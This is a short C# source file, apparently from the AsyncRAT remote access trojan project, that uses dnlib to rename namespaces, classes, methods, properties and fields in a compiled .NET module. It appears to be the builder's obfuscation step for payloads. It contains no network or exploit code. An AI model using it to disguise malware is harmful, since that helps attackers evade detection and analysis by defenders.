using AsyncRAT_Sharp.RenamingObfuscation.Classes;
using AsyncRAT_Sharp.RenamingObfuscation.Interfaces;
using dnlib.DotNet;

namespace AsyncRAT_Sharp.RenamingObfuscation
{
   public class Renaming
    {

        public static ModuleDefMD DoRenaming(ModuleDefMD inPath)
        {
            ModuleDefMD module = inPath;
            return RenamingObfuscation(inPath);
        }

        private static ModuleDefMD RenamingObfuscation(ModuleDefMD inModule)
        {
            ModuleDefMD module = inModule;

            IRenaming rnm = new NamespacesRenaming();

            module = rnm.Rename(module);

            rnm = new ClassesRenaming();

            module = rnm.Rename(module);

            rnm = new MethodsRenaming();

            module = rnm.Rename(module);

            rnm = new PropertiesRenaming();

            module = rnm.Rename(module);

            rnm = new FieldsRenaming();

            module = rnm.Rename(module);

            return module;
        }
    }
}
